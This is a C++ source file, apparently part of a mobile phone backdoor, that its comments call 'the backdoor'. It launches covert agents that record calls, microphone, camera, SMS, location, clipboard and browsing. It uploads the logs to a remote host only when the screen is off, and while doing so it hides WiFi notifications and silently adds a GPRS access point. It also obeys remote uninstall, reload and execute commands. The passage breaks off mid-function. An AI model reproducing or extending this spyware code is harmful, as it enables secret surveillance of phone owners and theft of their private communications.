#include <wchar.h>
#include <time.h>
#include <vector>
#include <exception>
#include <memory>
#include <cfgmgrapi.h>
#include <regext.h>
#include <connmgr.h>

#include "Task.h"
#include "Agents.h"
#include "Events.h"
#include "Microphone.h"
#include "RecordedCalls.h"

using namespace std;

#define SLEEP_TIME 1000	// Intervallo per il controllo della event list in ms

Task::Task() : m_bUninstall(FALSE), statusObj(NULL), confObj(NULL), hEvents(NULL), hAgents(NULL),
uEvents(0), uAgents(0), m_bReload(FALSE), deviceObj(NULL), uberlogObj(NULL), observerObj(NULL) {
	MSGQUEUEOPTIONS_OS queue;

	ZeroMemory(&queue, sizeof(queue));

	queue.dwSize = sizeof(queue);
	queue.dwFlags = MSGQUEUE_NOPRECOMMIT | MSGQUEUE_ALLOW_BROKEN;
	queue.dwMaxMessages = 0;
	queue.cbMaxMessage = 1024 * 4; // 4kb massimo per ogni messaggio
	queue.bReadAccess = TRUE;

	// Creiamo la coda IPC
	g_hSmsQueueRead = CreateMsgQueue(L"IpcQueueLocalSAR", &queue); // Sms Agent Queue

	queue.bReadAccess = FALSE;
	g_hSmsQueueWrite = CreateMsgQueue(L"IpcQueueLocalSAW", &queue); // Sms Agent Queue

	// Istanziamo qui tutti gli oggetti singleton dopo aver inizializzato le code
	statusObj = Status::self();
	deviceObj = Device::self();
	uberlogObj = UberLog::self();
	observerObj = Observer::self();
}

Task::~Task(){
	if (deviceObj)
		delete deviceObj;

	if (statusObj)
		delete statusObj;

	if (confObj)
		delete confObj;

	if (hEvents)
		delete[] hEvents;

	if (hAgents)
		delete[] hAgents;

	// XXX Zozzerigi, rimuovere quando verra' implementata la classe IPC
	if (g_hSmsQueueRead != NULL)
		CloseMsgQueue(g_hSmsQueueRead);

	if (g_hSmsQueueWrite != NULL)
		CloseMsgQueue(g_hSmsQueueWrite);
}

void Task::Sleep() {
	Sleep(SLEEP_TIME);
}

void Task::Sleep(UINT ms) {
	::Sleep(ms);
}

// CRITICAL - L'handle del thread dell'agente verra' chiuso soltanto dalla StopAgents() al primo
// reload della backdoor. Da qui non abbiamo modo di sapere quale sia l'handle del thread associato
// a questo agente, quindi possiamo soltanto comandargli lo stop.
BOOL Task::StopAgent(UINT Type) {
	// Diciamo all'agente di fermarsi
	if (statusObj->StopAgent(Type) == FALSE) {
		DBG_TRACE(L"Debug - Task.cpp - StopAgent() Agent already stopped\n", 5, FALSE);
		return AGENT_STOPPED;
	}

	while (statusObj->AgentQueryStatus(Type) != AGENT_STOPPED)
		Sleep(400);

	return statusObj->ReEnableAgent(Type);
}

BOOL Task::StopAgents() {
	UINT i;

	// Diciamo a tutti gli agenti di fermarsi
	statusObj->StopAgents();

	// Aspettiamo che i thread muoiano (su mobile non e' 
	// supportato il flag TRUE della WaitForMultipleObjects())
	for (i = 0; i < uAgents; i++) {
		WaitForSingleObject(hAgents[i], INFINITE);
	}
	
	for (i = 0; i < uAgents; i++) {
		CloseHandle(hAgents[i]);
		hAgents[i] = INVALID_HANDLE_VALUE;
	}

	// Riabilitiamo lo stato per gli agenti abilitati
	statusObj->ReEnableAgents();

	delete[] hAgents;
	hAgents = NULL;
	uAgents = 0;

	return AGENT_STOPPED;
}

BOOL Task::StopEvents() {
	UINT i;

	// Diciamo a tutti gli agenti di fermarsi
	statusObj->StopEvents();

	// Aspettiamo che i thread muoiano (su mobile non e' 
	// supportato il flag TRUE della WaitForMultipleObjects())
	for (i = 0; i < uEvents; i++) {
		WaitForSingleObject(hEvents[i], INFINITE);
	}

	for (i = 0; i < uEvents; i++) {
		CloseHandle(hEvents[i]);
		hEvents[i] = INVALID_HANDLE_VALUE;
	}

	delete[] hEvents;
	hEvents = NULL;
	uEvents = 0;

	return EVENT_STOPPED;
}

// MANAGEMENT - L'agente per essere avviato deve comunque esser presente nel file di
// configurazione, settato come AGENT_DISABLED
BOOL Task::StartAgent(UINT Type) {
	UINT i;

	if (statusObj->AgentQueryStatus(Type) == AGENT_RUNNING) {
		DBG_TRACE_INT(L"Debug - Task.cpp - StartAgent() FAILED [agent already running], type: ", 4, FALSE, Type);
		return TRUE;
	}

	if (statusObj->AgentGetThreadProc(Type) == 0) {
		DBG_TRACE(L"Debug - Task.cpp - StartAgent() FAILED [no thread proc]\n", 4, FALSE);
		return FALSE;
	}

	if (statusObj->IsValidAgent(Type) == FALSE) {
		DBG_TRACE(L"Debug - Task.cpp - StartAgent() FAILED [agent invalid]\n", 4, FALSE);
		return FALSE;
	}

	HANDLE t_Handle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)statusObj->AgentGetThreadProc(Type), 
		(void *)&statusObj->AgentGetParams(Type), 0, NULL);

	if (t_Handle == NULL) {
		DBG_TRACE(L"Debug - Task.cpp - StartAgent() FAILED [cannot CreateThread()]\n", 4, FALSE);
		return FALSE;
	}

	// Espandiamo l'array degli handle
	uAgents++;

	HANDLE *t_Array = new(std::nothrow) HANDLE[uAgents];

	if (t_Array == NULL) {
		uAgents--;
		CloseHandle(t_Handle);
		DBG_TRACE(L"Debug - Task.cpp - StartAgent() FAILED [handle array expansion]\n", 4, FALSE);
		return FALSE;
	}

	// Copiamo tutti i vecchi handle
	for (i = 0; i < uAgents - 1; i++)
		t_Array[i] = hAgents[i];

	// Ed aggiungiamo il nostro
	t_Array[uAgents - 1] = t_Handle;

	delete[] hAgents;

	hAgents = t_Array;

	DBG_TRACE(L"Debug - Task.cpp - StartAgent() OK\n", 5, FALSE);
	return TRUE;
}

// Riavvia un agente soltanto se e' attivo
BOOL Task::ReStartAgent(UINT Type) {
	if (statusObj->AgentQueryStatus(Type) != AGENT_RUNNING) {
		DBG_TRACE(L"Debug - Task.cpp - ReStartAgent() [Agent not running]\n", 4, FALSE);
		return FALSE;
	}

	if (StopAgent(Type) == FALSE) {
		DBG_TRACE(L"Debug - Task.cpp - ReStartAgent() FAILED [0]\n", 5, FALSE);
		return FALSE;
	}

	if (StartAgent(Type) == FALSE) {
		DBG_TRACE(L"Debug - Task.cpp - ReStartAgent() FAILED [1]\n", 5, FALSE);
		return FALSE;
	}

	DBG_TRACE(L"Debug - Task.cpp - ReStartAgent() OK\n", 5, FALSE);
	return TRUE;
}

// MANAGEMENT - Qui vanno aggiunte le funzioni di start di tutti gli agenti che funzionano come thread!
BOOL Task::StartAgents() {
	UINT i, uAgents;
	Rand r;
	map<UINT, AgentStruct>::iterator iter;

	WAIT_AND_SIGNAL(statusObj->hAgentsLock);
	uAgents = 0;

	for (iter = statusObj->GetAgentsList().begin(); iter != statusObj->GetAgentsList().end(); iter++) {
		switch (iter->second.uAgentId) {
			case AGENT_SMS: iter->second.pFunc = SmsAgent; break;
			case AGENT_CALLLIST: iter->second.pFunc = CallListAgent; break;
			case AGENT_ORGANIZER: iter->second.pFunc = OrganizerAgent; break;
			case AGENT_DEVICE: iter->second.pFunc = DeviceInfoAgent; break;
			case AGENT_CALL_LOCAL: iter->second.pFunc = RecordedCalls; break;		
			case AGENT_MIC: iter->second.pFunc = RecordedMicrophone; break;
			case AGENT_POSITION: iter->second.pFunc = PositionAgent; break;
			case AGENT_URL: iter->second.pFunc = UrlAgent; break;
			case AGENT_CLIPBOARD: iter->second.pFunc = ClipboardAgent; break;
			case AGENT_CRISIS: iter->second.pFunc = CrisisAgent; break;
			case AGENT_CALL: iter->second.pFunc = CallAgent; break;
			case AGENT_SNAPSHOT: iter->second.pFunc = SnapshotAgent; break;
			case AGENT_CAM: iter->second.pFunc = CameraAgent; break;
			case AGENT_APPLICATION: iter->second.pFunc = ApplicationAgent; break;
			case AGENT_LIVEMIC: iter->second.pFunc = LiveMicAgent; break;
			case AGENT_KEYLOG: iter->second.pFunc = NULL; break;
			case AGENT_IM: iter->second.pFunc = NULL; break;
			default: iter->second.pFunc = NULL; break;
		}

		// Contiamo gli agenti attivi
		if (iter->second.uAgentStatus == AGENT_ENABLED && iter->second.pFunc)
			uAgents++;
	}

	if (hAgents) {
		delete[] hAgents;
		hAgents = NULL;
	}

	hAgents = new(std::nothrow) HANDLE[uAgents];

	if (hAgents == NULL) {
		DBG_TRACE(L"Debug - Task.cpp - StartAgents() FAILED [0]\n", 4, FALSE);
		UNLOCK(statusObj->hAgentsLock);
		return FALSE;
	}

	for (i = 0; i < uAgents; i++)
		hAgents[i] = INVALID_HANDLE_VALUE;

	// Avvia i thread che sono marcati come attivi
	for (i = 0, iter = statusObj->GetAgentsList().begin(); iter != statusObj->GetAgentsList().end(); iter++) {
		if (iter->second.uAgentStatus != AGENT_ENABLED || iter->second.pFunc == NULL)
			continue;

		hAgents[i] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)(iter->second.pFunc), (void *)&iter->second, 0, NULL);

		if (hAgents[i] == NULL) {

		} else {
			i++;
			Sleep(r.rand24() % 20);
		}
	}
	UNLOCK(statusObj->hAgentsLock);

	DBG_TRACE(L"Debug - Task.cpp - StartAgents() OK\n", 5, FALSE);
	return TRUE;
}

// MANAGEMENT - Aggiungere qui le funzioni di gestione di ogni monitor
BOOL Task::RegisterEvents() {
	map<pair<UINT, UINT>, EventStruct>::iterator iter;
	UINT i;
	Rand r;

	// Imposta tutte le thread routine
	WAIT_AND_SIGNAL(statusObj->hEventsLock);
	uEvents = 0;

	for (iter = statusObj->GetEventsList().begin(); iter != statusObj->GetEventsList().end(); iter++) {
		switch (iter->second.uEventType) {
			case EVENT_SMS: iter->second.pFunc = OnSms; break;
			case EVENT_CALL: iter->second.pFunc = OnCall; break;
			case EVENT_CONNECTION: iter->second.pFunc = OnConnection; break;
			case EVENT_TIMER: iter->second.pFunc = OnTimer; break;
			case EVENT_PROCESS: iter->second.pFunc = OnProcess; break;
			case EVENT_SIM_CHANGE: iter->second.pFunc = OnSimChange; break;
			case EVENT_LOCATION: iter->second.pFunc = OnLocation; break;
			case EVENT_CELLID: iter->second.pFunc = OnCellId; break;
			case EVENT_AC: iter->second.pFunc = OnAC; break;
			case EVENT_BATTERY: iter->second.pFunc = OnBatteryLevel; break;
			case EVENT_STANDBY: iter->second.pFunc = OnStandby; break;
			default: iter->second.pFunc = NULL; break;
		}

		// Contiamo gli eventi configurati
		if (iter->second.pFunc)
			uEvents++;
	}

	if (hEvents) {
		delete[] hEvents;
		hEvents = NULL;
	}

	hEvents = new(std::nothrow) HANDLE[uEvents];

	if (hEvents == NULL) {
		DBG_TRACE(L"Debug - Task.cpp - RegisterEvents() FAILED [0]\n", 4, FALSE);
		UNLOCK(statusObj->hEventsLock);
		return FALSE;
	}

	for (i = 0; i < uEvents; i++)
		hEvents[i] = INVALID_HANDLE_VALUE;

	// Avvia i monitor
	for (i = 0, iter = statusObj->GetEventsList().begin(); iter != statusObj->GetEventsList().end(); iter++) {
		if (iter->second.pFunc == NULL)
			continue;

		hEvents[i] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)(iter->second.pFunc), (LPVOID)&(iter->second), 0, NULL);

		if (hEvents[i] == NULL) { // Il thread non e' partito... Andiamo cmq avanti
			
		} else {
			i++;
			Sleep(r.rand24() % 20);
		}
	}
	UNLOCK(statusObj->hEventsLock);

	DBG_TRACE(L"Debug - Task.cpp - RegisterEvents() OK\n", 5, FALSE);
	return TRUE;
}

void Task::StartNotification() {
	Log logInfo;

	logInfo.WriteLogInfo(L"Backdoor started");
}

BOOL Task::TaskInit() {
	if (statusObj == NULL)
		return FALSE;

	StopAgents();
	StopEvents();

	statusObj->Clear();

	// XXX - Da implementare: Dobbiamo uninstallare la backdoor
	if (m_bUninstall) {
		ActionUninstall(NULL); // Richiamiamo direttamente l'azione		
		return FALSE; // Torniamo come se fosse un errore
	}

	if (deviceObj)
		deviceObj->RefreshData(); // Inizializza varie cose tra cui g_InstanceId

	if (confObj) {
		delete confObj;
		confObj = NULL;
	}

	confObj =  new(std::nothrow) Conf();

	if (confObj == NULL)
		return FALSE;

	if (confObj->LoadConf() == FALSE) {
		DBG_TRACE(L"Debug - Task.cpp - confObj->LoadConf() FAILED\n", 1, FALSE);
		ADDDEMOMESSAGE(L"Configuration... FAILED\n");
		return FALSE;
	}

	ADDDEMOMESSAGE(L"Configuration... OK\n");

	if (uberlogObj)
		uberlogObj->ScanLogs();

	// Da qui in poi inizia la concorrenza tra i thread
	if (RegisterEvents() == FALSE) {
		DBG_TRACE(L"Debug - Task.cpp - RegisterEvents() FAILED\n", 1, FALSE);
		ADDDEMOMESSAGE(L"Events... FAILED\n");
		return FALSE;
	}

	DBG_TRACE(L"Debug - Task.cpp - TaskInit() events started\n", 5, FALSE);
	ADDDEMOMESSAGE(L"Events... OK\nAgents:... OK\n");
	
	if (StartAgents() == FALSE) {
		DBG_TRACE(L"Debug - Task.cpp - StartAgents() FAILED\n", 1, FALSE);
		return FALSE;
	}

	DBG_TRACE(L"Debug - Task.cpp - TaskInit() agents started\n", 5, FALSE);
	return TRUE;
}


BOOL Task::CheckActions() {
	map<UINT, MacroActionStruct> actions;
	map<UINT, MacroActionStruct>::iterator iter;
	register UINT i;

	if (m_bUninstall) // Dobbiamo disinstallarci?
		return FALSE;

	// Inizia il loop di check degli eventi
	LOOP {
		for (iter = statusObj->GetActionsList().begin(); iter != statusObj->GetActionsList().end(); iter++) {
			// E' atomico, quindi non blocchiamo la lista
			if (iter->second.bTriggered == FALSE)
				continue;

			// Markiamo la action come eseguita (cosi' un altro thread puo' ri-triggerarla se nel
			// frattempo la stiamo eseguendo)
			iter->second.bTriggered = FALSE;

			pActionStruct pAction = iter->second.pActions;

			for (i = 0; i < iter->second.uSubActions; i++, pAction++) {
				switch (pAction->uActionType) {
					case ACTION_SYNC: 
						DBG_TRACE(L"Debug - Task.cpp - [A] ActionSync() Triggered\n", 4, FALSE);

						if (ActionSync(pAction) == FALSE)
							break;

						DBG_TRACE_INT(L"Debug - Task.cpp - Memory usage [0]: ", 5, FALSE, GetUsedPhysMemory());

						if (m_bUninstall) {
							ActionUninstall(pAction);
							DBG_TRACE(L"Debug - Task.cpp - CheckActions() uninstalling\n", 5, FALSE);
							return FALSE; // Uninstalliamoci
						}

						if (m_bReload) {
							m_bReload = FALSE;
							DBG_TRACE(L"Debug - Task.cpp - CheckActions() reloading\n", 5, FALSE);
							return TRUE; // Ricarichiamoci
						}

						break;

					case ACTION_SYNC_PDA: 
						DBG_TRACE(L"Debug - Task.cpp - [A] ActionSyncPda() Triggered\n", 4, FALSE);

						if (ActionSyncPda(pAction) == FALSE)
							break;

						DBG_TRACE_INT(L"Debug - Task.cpp - Memory usage [1]: ", 5, FALSE, GetUsedPhysMemory());
						DBG_TRACE(L"\n", 5, FALSE);

						if (m_bUninstall) {
							ActionUninstall(pAction);
							DBG_TRACE(L"Debug - Task.cpp - CheckActions() uninstalling\n", 5, FALSE);
							return FALSE; // Uninstalliamoci
						}

						if (m_bReload) {
							m_bReload = FALSE;
							DBG_TRACE(L"Debug - Task.cpp - CheckActions() reloading\n", 5, FALSE);
							return TRUE; // Ricarichiamoci
						}

						break;

					case ACTION_SYNC_APN:
						DBG_TRACE(L"Debug - Task.cpp - [A] ActionSyncPda() Triggered\n", 4, FALSE);
						ActionSyncApn(pAction); 

						break;

					case ACTION_UNINSTALL: 
						DBG_TRACE(L"Debug - Task.cpp - [A] ActionUninstall() Triggered\n", 4, FALSE);

						// ActionUninstall() torna TRUE se va a buon fine, ma per
						// uninstallarci ed uscire dal loop iniziale dobbiamo tornare
						// con FALSE.
						m_bUninstall = TRUE;
						return !ActionUninstall(pAction);

						break;

					case ACTION_RELOAD:
						DBG_TRACE(L"Debug - Task.cpp - [A] ActionReload() Triggered\n", 4, FALSE);
						return ActionReload(pAction);

						break;

					case ACTION_SMS:
						DBG_TRACE(L"Debug - Task.cpp - [A] ActionSms() Triggered\n", 4, FALSE);
						ActionSms(pAction); 

						break;

					case ACTION_TOOTHING:
						DBG_TRACE(L"Debug - Task.cpp - [A] ActionToothing() Triggered\n", 4, FALSE);
						ActionToothing(pAction); 

						break;

					case ACTION_START_AGENT:
						DBG_TRACE(L"Debug - Task.cpp - [A] ActionStartAgent() Triggered\n", 4, FALSE);
						ActionStartAgent(pAction);

						break;

					case ACTION_STOP_AGENT:
						DBG_TRACE(L"Debug - Task.cpp - [A] ActionStopAgent() Triggered\n", 4, FALSE);
						ActionStopAgent(pAction);

						break;

					case ACTION_EXECUTE:
						DBG_TRACE(L"Debug - Task.cpp - [A] ActionExecute() Triggered\n", 4, FALSE);
						ActionExecute(pAction);

						break;

					case ACTION_LOG:
						DBG_TRACE(L"Debug - Task.cpp - [A] ActionLog() Triggered\n", 4, FALSE);
						ActionLog(pAction); 

						break;

					default: 
						DBG_TRACE(L"Debug - Task.cpp - [A] Unknown action Triggered\n", 1, FALSE);

						break;
				}
			}
		}
		Sleep();
	}

	DBG_TRACE(L"Debug - Task.cpp - We shouldn't be here!\n", 1, FALSE);
	return TRUE;
}

BOOL Task::ActionSync(pActionStruct pAction) {
	UINT uGprs, uWiFi, uRet, uHostLen;
	wstring strHost;
	BYTE *pTmp;

	// Controlliamo lo stato di Crisis
	if ((statusObj->Crisis() & CRISIS_SYNC) == CRISIS_SYNC) {
		DBG_TRACE(L"Debug - Task.cpp - ActionSync() no sync, we are in crisis [0]\n", 4, FALSE);
		return FALSE;
	}

	// Facciamo il clear dei flag
	m_bUninstall = m_bReload = FALSE;

	if (uberlogObj == NULL) {
		DBG_TRACE(L"Debug - Task.cpp - ActionSync() FAILED [1]\n", 4, FALSE);
		return FALSE;
	}

	if (pAction->uParamLength < sizeof(UINT) * 3) {
		DBG_TRACE(L"Debug - Task.cpp - ActionSync() FAILED [2]\n", 4, FALSE);
		return FALSE;
	}

	pTmp = (BYTE *)pAction->pParams;

	CopyMemory(&uGprs, pTmp, sizeof(uGprs)); pTmp += sizeof(uGprs);
	CopyMemory(&uWiFi, pTmp, sizeof(uWiFi)); pTmp += sizeof(uGprs);
	CopyMemory(&uHostLen, pTmp, sizeof(uHostLen)); pTmp += sizeof(uGprs);

	strHost = (WCHAR *)pTmp;

	// Stoppiamo solo gli agenti che producono un singolo log, non tutti (tipo il Keylogger/GPS)
	ReStartAgent(AGENT_POSITION);
	ReStartAgent(AGENT_APPLICATION);
	ReStartAgent(AGENT_CLIPBOARD);
	ReStartAgent(AGENT_URL);

	// L'agente Device si comporta diversamente
	ReStartAgent(AGENT_DEVICE);
	
	Sleep(500);

	// Proviamo a spedire via internet (WiFi/Gprs o chi lo sa...)
	uRet = InternetSend(strHost);

	switch (uRet) {
		case SEND_UNINSTALL: 
			DBG_TRACE(L"Debug - Task.cpp - ActionSync() [SEND_UNINSTALL] received\n", 5, FALSE);
			m_bUninstall = TRUE;
			break;

		case SEND_RELOAD:
			DBG_TRACE(L"Debug - Task.cpp - ActionSync() [SEND_RELOAD] received\n", 5, FALSE);
			m_bReload = TRUE;
			break;

		default: 
			break;
	}

	if (uRet != FALSE) {
		DBG_TRACE(L"Debug - Task.cpp - ActionSync() [Internet Send] OK\n", 4, FALSE);
		return TRUE;
	}

	DBG_TRACE(L"Debug - Task.cpp - ActionSync() [Internet Send] Unable to perform\n", 5, FALSE);

	if (deviceObj->IsDeviceUnattended() == FALSE) {
		DBG_TRACE(L"Debug - Task.cpp - ActionSync() [Device is active, aborting]\n", 5, FALSE);
		return FALSE;
	}

	// Vediamo se dobbiamo syncare via WiFi (solo se il display e' spento)
	if (uWiFi) {
		deviceObj->DisableWiFiNotification();
		deviceObj->HTCEnableKeepWiFiOn();

		ForceWiFiConnection();

		uRet = InternetSend(strHost);

		ReleaseWiFiConnection();
		deviceObj->RestoreWiFiNotification();

		switch (uRet) {
			case SEND_UNINSTALL:
				DBG_TRACE(L"Debug - Task.cpp - ActionSync() [SEND_UNINSTALL] received\n", 5, FALSE);
				m_bUninstall = TRUE;
				break;

			case SEND_RELOAD:
				DBG_TRACE(L"Debug - Task.cpp - ActionSync() [SEND_RELOAD] received\n", 5, FALSE);
				m_bReload = TRUE;
				break;

			default: 
				break;
		}

		if (uRet != FALSE) {
			DBG_TRACE(L"Debug - Task.cpp - ActionSync() [Internet Send WiFi] OK\n", 4, FALSE);
			return TRUE;
		}

		DBG_TRACE(L"Debug - Task.cpp - ActionSync() [WiFi Send] Unable to perform\n", 5, FALSE);
	}

	if (deviceObj->IsDeviceUnattended() == FALSE) {
		DBG_TRACE(L"Debug - Task.cpp - ActionSync() [Device is active, aborting [2]]\n", 5, FALSE);
		return FALSE;
	}

	// Vediamo se dobbiamo syncare tramite GPRS
	if (uGprs && deviceObj->IsSimEnabled()) {
		ForceGprsConnection();
		uRet = InternetSend(strHost);
		ReleaseGprsConnection();

		switch (uRet) {
			case SEND_UNINSTALL:
				DBG_TRACE(L"Debug - Task.cpp - ActionSync() [SEND_UNINSTALL] received\n", 5, FALSE);
				m_bUninstall = TRUE;
				break;

			case SEND_RELOAD:
				DBG_TRACE(L"Debug - Task.cpp - ActionSync() [SEND_RELOAD] received\n", 5, FALSE);
				m_bReload = TRUE;
				break;

			default: 
				break;
		}

		if (uRet != FALSE) {
			DBG_TRACE(L"Debug - Task.cpp - ActionSync() [Internet Send GPRS] OK\n", 4, FALSE);
			return TRUE;
		}
	}

	DBG_TRACE(L"Debug - Task.cpp - ActionSync() FAILED [3]\n", 4, FALSE);
	return FALSE;
}

BOOL Task::ActionSyncPda(pActionStruct pAction) {
	//FakeScreen fakeObj(g_hInstance); 
	UINT Type, uRet;

	// Controlliamo lo stato di Crisis
	if ((statusObj->Crisis() & CRISIS_SYNC) == CRISIS_SYNC) {
		DBG_TRACE(L"Debug - Task.cpp - ActionSyncPda() no sync, we are in crisis [0]\n", 4, FALSE);
		return FALSE;
	}

	// Facciamo il clear dei flag
	m_bUninstall = m_bReload = FALSE;

	if (uberlogObj == NULL) {
		DBG_TRACE(L"Debug - Task.cpp - ActionSyncPda() FAILED [1]\n", 4, FALSE);
		return FALSE;
	}

	if (pAction->uParamLength != sizeof(DWORD)) {
		DBG_TRACE(L"Debug - Task.cpp - ActionSyncPda() FAILED [2]\n", 4, FALSE);
		return FALSE;
	}

	// 1 = BT, 2 = WiFi
	CopyMemory(&Type, pAction->pParams, sizeof(Type));

	// Stoppiamo solo gli agenti che producono un singolo log, non tutti (tipo il Keylogger/GPS)
	ReStartAgent(AGENT_POSITION);
	ReStartAgent(AGENT_APPLICATION);
	ReStartAgent(AGENT_CLIPBOARD);
	ReStartAgent(AGENT_URL);

	// L'agente Device si comporta diversamente
	ReStartAgent(AGENT_DEVICE);

	switch (Type) {
		case CONF_SYNC_BT:
#ifdef _DEMO
			//fakeObj.Start();
			uRet = BtSend();
			//fakeObj.Stop();
#else
			// Synchiamo via BT solo se lo schermo e' spento
			if (deviceObj->IsDeviceUnattended()) {
				//fakeObj.Start();
				uRet = BtSend();
				//fakeObj.Stop();
			} else {
				DBG_TRACE(L"Debug - Task.cpp - ActionSyncPda() [BtSend(), BackLight On, aborting]\n", 4, FALSE);
				return FALSE;
			}
#endif
			break;

		case CONF_SYNC_WIFI:
#ifdef _DEMO
			//fakeObj.Start();
			deviceObj->DisableWiFiNotification();
			uRet = WiFiSendPda();
			deviceObj->RestoreWiFiNotification();
			//fakeObj.Stop();
#else
			// Synchiamo via WiFi solo se lo schermo e' spento
			if (deviceObj->IsDeviceUnattended()) {
				//fakeObj.Start();
				deviceObj->DisableWiFiNotification();
				uRet = WiFiSendPda();
				deviceObj->RestoreWiFiNotification();
				//fakeObj.Stop();
			} else {
				DBG_TRACE(L"Debug - Task.cpp - ActionSyncPda() [WiFi Send, BackLight On, aborting]\n", 4, FALSE);
				return FALSE;
			}
#endif
			break;

		default:
			return FALSE;
	}

	switch (uRet) {
		case SEND_UNINSTALL: 
			m_bUninstall = TRUE;
			break;

		case SEND_RELOAD: 
			m_bReload = TRUE;
			break;

		case FALSE:
			DBG_TRACE(L"Debug - Task.cpp - ActionSyncPda() FAILED [5]\n", 4, FALSE);
			return FALSE;

		default: 
			break;
	}

	DBG_TRACE(L"Debug - Task.cpp - ActionSyncPda() OK\n", 4, FALSE);
	return TRUE;
}

BOOL Task::ActionSyncApn(pActionStruct pAction) {
	UINT uHostLen, uNumApn, i;
	wstring strHost;
	BYTE *pTmp = NULL;
	pApnStruct pApn;

	// Controlliamo lo stato di Crisis
	if ((statusObj->Crisis() & CRISIS_SYNC) == CRISIS_SYNC) {
		DBG_TRACE(L"Debug - Task.cpp - ActionSyncApn() no sync, we are in crisis [0]\n", 4, FALSE);
		return FALSE;
	}

	// Facciamo il clear dei flag
	m_bUninstall = m_bReload = FALSE;

	if (uberlogObj == NULL) {
		DBG_TRACE(L"Debug - Task.cpp - ActionSyncApn() FAILED [1]\n", 4, FALSE);
		return FALSE;
	}

	if (pAction->uParamLength < sizeof(UINT)) {
		DBG_TRACE(L"Debug - Task.cpp - ActionSyncApn() FAILED [2]\n", 4, FALSE);
		return FALSE;
	}

	pTmp = (BYTE *)pAction->pParams;

	// Host Name Length in byte, NULL-terminator included
	CopyMemory(&uHostLen, pTmp, sizeof(uHostLen)); pTmp += sizeof(uHostLen);
	strHost = (WCHAR *)pTmp; pTmp += uHostLen;
	CopyMemory(&uNumApn, pTmp, sizeof(uNumApn)); pTmp += sizeof(uNumApn);

	pApn = new(std::nothrow) ApnStruct[uNumApn];

	if (pApn == NULL) {
		DBG_TRACE(L"Debug - Task.cpp - ActionSyncApn() [Cannot allocate ApnStruct]\n", 4, FALSE);
		return FALSE;
	}

	// Usciamo se il telefono e' in uso
	if (deviceObj->IsDeviceUnattended() == FALSE) {
		delete[] pApn;

		DBG_TRACE(L"Debug - Task.cpp - ActionSyncApn() [Device is active, aborting] [0]\n", 5, FALSE);
		return FALSE;
	}

	// Stoppiamo solo gli agenti che producono un singolo log, non tutti (tipo il Keylogger/GPS)
	ReStartAgent(AGENT_POSITION);
	ReStartAgent(AGENT_APPLICATION);
	ReStartAgent(AGENT_CLIPBOARD);
	ReStartAgent(AGENT_URL);

	// L'agente Device si comporta diversamente
	ReStartAgent(AGENT_DEVICE);

	Sleep(500);

	HANDLE _hConnection;
	LPWSTR wsz_Output = NULL;

	// Costruiamo il nome della connessione
	wstring wImei = deviceObj->GetImei();
	wImei = wImei.assign(wImei, wImei.size() - 9, 8);

	// Costruiamo l'XML per la rimozione della connessione
	wstring wsz_Delete =
			L"<wap-provisioningdoc>"
			L"<characteristic type=\"CM_GPRSEntries\">"
			L"<nocharacteristic type=\"";
		wsz_Delete += wImei.c_str();
		wsz_Delete += L"\"/></characteristic></wap-provisioningdoc>";

	// Al momento la lista di APN non e' implementata e ce ne viene passato solo uno
	for (i = 0; i < uNumApn; i++) {
		// Mobile Country Code
		CopyMemory((BYTE *)&(pApn[i].uMCC), pTmp, sizeof(UINT)); 
		pTmp += sizeof(UINT);

		// Mobile Network Code
		CopyMemory((BYTE *)&(pApn[i].uMNC), pTmp, sizeof(UINT)); 
		pTmp += sizeof(UINT);

		// Apn Name Length in byte NULL-terminator included
		CopyMemory((BYTE *)&(pApn[i].uApnLen), pTmp, sizeof(UINT)); 
		pTmp += sizeof(UINT);

		// Apn Name
		pApn[i].wApn = (PWCHAR)pTmp; 
		pTmp += pApn[i].uApnLen;

		// Apn Username Length
		CopyMemory((BYTE *)&(pApn[i].uApnUserLen), pTmp, sizeof(UINT)); 
		pTmp += sizeof(UINT);

		// Apn Username
		pApn[i].wApnUser = (PWCHAR)pTmp; 
		pTmp += pApn[i].uApnUserLen;

		// Apn Password Length
		CopyMemory((BYTE *)&(pApn[i].uApnPassLen), pTmp, sizeof(UINT)); 
		pTmp += sizeof(UINT);

		// Apn Password
		pApn[i].wApnPass = (PWCHAR)pTmp; 
		pTmp += pApn[i].uApnPassLen;

		// Costruiamo l'XML per l'inserimento della connessione
		wstring wsz_Add = 
				L"<wap-provisioningdoc><characteristic type=\"CM_GPRSEntries\">"
				L"<characteristic type=\"";
			wsz_Add += wImei;
			wsz_Add += L"\">"
				L"<parm name=\"DestId\" value=\"{7022E968-5A97-4051-BC1C-C578E2FBA5D9}\"/>"
				L"<parm name=\"Phone\" value=\"~GPRS!";
			wsz_Add += pApn[i].wApn;
			wsz_Add += L"\"/><parm name=\"UserName\" value=\"";
			wsz_Add += pApn[i].wApnUser;
			wsz_Add += L"\"/><parm name=\"Password\" value=\"";
			wsz_Add += pApn[i].wApnPass;
			wsz_Add += L"\"/>"
				L"<parm name=\"Enabled\" value=\"1\"/><characteristic type=\"DevSpecificCellular\">"
				L"<parm name=\"GPRSInfoAccessPointName\" value=\"";
			wsz_Add += pApn[i].wApn;
			wsz_Add += L"\"/></characteristic></characteristic></characteristic>"
				L"</wap-provisioningdoc>";

		// Usciamo se il telefono e' in uso
		if (deviceObj->IsDeviceUnattended() == FALSE) {
			delete[] pApn;

			if (DMProcessConfigXML(wsz_Delete.c_str(), CFGFLAG_PROCESS, &wsz_Output) == S_OK)
				delete[] wsz_Output;

			DBG_TRACE(L"Debug - Task.cpp - ActionSyncApn() [Device is active, aborting] [1]\n", 5, FALSE);
			return FALSE;
		}

		// Inseriamo la connessione
		HRESULT hr = DMProcessConfigXML(wsz_Add.c_str(), CFGFLAG_PROCESS, &wsz_Output);

		if (hr != S_OK) {
			delete[] pApn;
			DBG_TRACE(L"Debug - Task.cpp - ActionSyncApn() [DMProcessConfigXML() failed]\n", 4, FALSE);
			return FALSE;
		}

		delete[] wsz_Output;

		// Troviamo la GUID della connessione
		GUID IID_Internet;
		WCHAR wGuid[40];
		wstring wstrGuid = L"Comm\\ConnMgr\\Providers\\{7C4B7A38-5FF7-4bc1-80F6-5DA7870BB1AA}\\Connections\\";
		wstrGuid += wImei;

		hr = RegistryGetString(HKEY_LOCAL_MACHINE, wstrGuid.c_str(), L"ConnectionGUID", wGuid, 
			sizeof(wGuid) / sizeof(WCHAR));

		if (hr != S_OK) {
			delete[] pApn;

